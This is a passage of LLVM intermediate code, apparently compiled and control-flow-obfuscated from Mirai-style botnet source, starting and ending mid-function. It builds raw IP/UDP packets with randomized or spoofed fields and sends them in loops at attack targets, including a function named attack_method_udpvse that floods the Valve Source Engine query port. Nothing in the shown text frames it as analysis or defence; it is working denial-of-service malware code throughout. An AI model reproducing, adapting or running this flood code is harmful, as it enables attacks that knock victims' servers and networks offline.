  %119 = load i8, i8* %12, align 1
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8 %119, i8* %121, align 1
  %122 = load i16, i16* %18, align 2
  %123 = zext i16 %122 to i64
  %124 = add i64 28, %123
  %125 = trunc i64 %124 to i16
  %126 = call zeroext i16 @htons(i16 zeroext %125) #8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 2
  store i16 %126, i16* %128, align 2
  %129 = load i16, i16* %13, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %129) #8
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 3
  store i16 %130, i16* %132, align 4
  %133 = load i8, i8* %14, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 5
  store i8 %133, i8* %135, align 4
  %136 = load i8, i8* %15, align 1
  %137 = icmp ne i8 %136, 0
  %138 = select i1 %137, i32 -469046840, i32 -71374552
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 4
  store i16 %140, i16* %142, align 2
  store i32 -71374552, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 6
  store i8 17, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 8
  store i32 %146, i32* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 9
  store i32 %154, i32* %156, align 4
  %157 = load i16, i16* %16, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #8
  %159 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %17, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #8
  %163 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 1
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %18, align 2
  %166 = zext i16 %165 to i64
  %167 = add i64 8, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #8
  %170 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  store i32 1526947100, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  store i32 -1643562135, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1748670866, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -394579442, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = load i8, i8* %5, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 -1692357895, i32 1374788889
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %23, align 8
  %189 = load i8*, i8** %23, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %24, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %25, align 8
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i64 1
  %196 = bitcast %struct.udphdr* %195 to i8*
  store i8* %196, i8** %26, align 8
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  %205 = select i1 %204, i32 141987443, i32 -1289594982
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 1
  %212 = load i32, i32* %211, align 4
  %213 = call i32 @ntohl(i32 %212) #8
  %214 = call i32 @rand_next()
  %215 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 2
  %220 = load i8, i8* %219, align 4
  %221 = zext i8 %220 to i32
  %222 = lshr i32 %214, %221
  %223 = add i32 %213, %222
  %224 = call i32 @htonl(i32 %223) #8
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  store i32 -1289594982, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %20, align 4
  %229 = icmp eq i32 %228, -1
  %230 = select i1 %229, i32 282628909, i32 -1876198749
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  store i32 -1876198749, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i16, i16* %13, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  %239 = select i1 %238, i32 1402640697, i32 -2075354006
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  store i32 -2075354006, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i16, i16* %16, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  %249 = select i1 %248, i32 -739642138, i32 -992353963
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = call i32 @rand_next()
  %252 = trunc i32 %251 to i16
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  store i32 -992353963, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i16, i16* %17, align 2
  %257 = zext i16 %256 to i32
  %258 = icmp eq i32 %257, 65535
  %259 = select i1 %258, i32 10759256, i32 1611035465
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  store i32 1611035465, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8, i8* %19, align 1
  %267 = icmp ne i8 %266, 0
  %268 = select i1 %267, i32 -1755176479, i32 1098486362
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %26, align 8
  %271 = load i16, i16* %18, align 2
  %272 = zext i16 %271 to i32
  call void @rand_str(i8* %270, i32 %272)
  store i32 1098486362, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %18, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %10, align 4
  %306 = load i8*, i8** %23, align 8
  %307 = load i16, i16* %18, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  store i32 1173836015, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %9, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %9, align 4
  store i32 -394579442, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 1748670866, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %323, %320, %273, %269, %265, %260, %255, %250, %245, %240, %235, %231, %227, %206, %183, %177, %176, %175, %172, %143, %139, %94, %88, %87, %84, %78, %77, %73, %72, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #7
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %56, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1885329952, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1885329952, label %first
    i32 935761215, label %59
    i32 236306010, label %60
    i32 -873017670, label %66
    i32 -512768526, label %69
    i32 853152111, label %70
    i32 -1474005501, label %76
    i32 -886589749, label %124
    i32 1204629506, label %128
    i32 1185714848, label %164
    i32 -1758118418, label %167
    i32 -1191299760, label %168
    i32 -1170090276, label %169
    i32 1143435262, label %175
    i32 1422126307, label %195
    i32 952397345, label %216
    i32 918190768, label %221
    i32 1485592870, label %226
    i32 -672845479, label %231
    i32 -454213822, label %236
    i32 533816917, label %241
    i32 -99470555, label %246
    i32 -823807508, label %293
    i32 1396493191, label %296
    i32 910928538, label %297
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %57 = icmp eq i32 %.reload, -1
  %58 = select i1 %57, i32 935761215, i32 236306010
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 910928538, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %10, align 4
  %62 = bitcast i32* %9 to i8*
  %63 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* %62, i32 4) #7
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 -873017670, i32 -512768526
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @close(i32 %67)
  store i32 910928538, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 853152111, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %9, align 4
  %72 = load i8, i8* %5, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %71, %73
  %75 = select i1 %74, i32 -1474005501, i32 -1758118418
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call noalias i8* @calloc(i64 128, i64 1) #7
  %78 = load i8**, i8*** %11, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  store i8* %77, i8** %81, align 8
  %82 = load i8**, i8*** %11, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8*, i8** %82, i64 %84
  %86 = load i8*, i8** %85, align 8
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %20, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i64 1
  %90 = bitcast %struct.iphdr* %89 to %struct.udphdr*
  store %struct.udphdr* %90, %struct.udphdr** %21, align 8
  %91 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %92 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %91, i64 1
  %93 = bitcast %struct.udphdr* %92 to i8*
  store i8* %93, i8** %22, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = load i8, i8* %95, align 4
  %97 = and i8 %96, 15
  %98 = or i8 %97, 64
  store i8 %98, i8* %95, align 4
  %99 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, -16
  %103 = or i8 %102, 5
  store i8 %103, i8* %100, align 4
  %104 = load i8, i8* %12, align 1
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* %19, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 32, %108
  %110 = trunc i64 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #8
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = load i16, i16* %13, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #8
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load i8, i8* %14, align 1
  %119 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 5
  store i8 %118, i8* %120, align 4
  %121 = load i8, i8* %15, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 -886589749, i32 1204629506
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %126 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 4
  store i16 %125, i16* %127, align 2
  store i32 1204629506, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  store i8 17, i8* %130, align 1
  %131 = load i32, i32* @LOCAL_ADDR, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 8
  store i32 %131, i32* %133, align 4
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 9
  store i32 %139, i32* %141, align 4
  %142 = load i16, i16* %16, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #8
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %17, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #8
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 1
  store i16 %147, i16* %149, align 2
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 12, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #8
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i8*, i8** %22, align 8
  %158 = bitcast i8* %157 to i32*
  store i32 -1, i32* %158, align 4
  %159 = load i8*, i8** %22, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 4
  store i8* %160, i8** %22, align 8
  %161 = load i8*, i8** %22, align 8
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %161, i8* %162, i32 %163)
  store i32 1185714848, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  store i32 853152111, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -1191299760, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1170090276, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %170, %172
  %174 = select i1 %173, i32 1143435262, i32 1396493191
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  %180 = load i8*, i8** %179, align 8
  store i8* %180, i8** %23, align 8
  %181 = load i8*, i8** %23, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %24, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %192, 32
  %194 = select i1 %193, i32 1422126307, i32 952397345
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @ntohl(i32 %201) #8
  %203 = call i32 @rand_next()
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = lshr i32 %203, %210
  %212 = add i32 %202, %211
  %213 = call i32 @htonl(i32 %212) #8
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  store i32 952397345, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i16, i16* %13, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 65535
  %220 = select i1 %219, i32 918190768, i32 1485592870
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = call i32 @rand_next()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 3
  store i16 %223, i16* %225, align 4
  store i32 1485592870, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i16, i16* %16, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = select i1 %229, i32 -672845479, i32 -454213822
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  store i32 -454213822, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
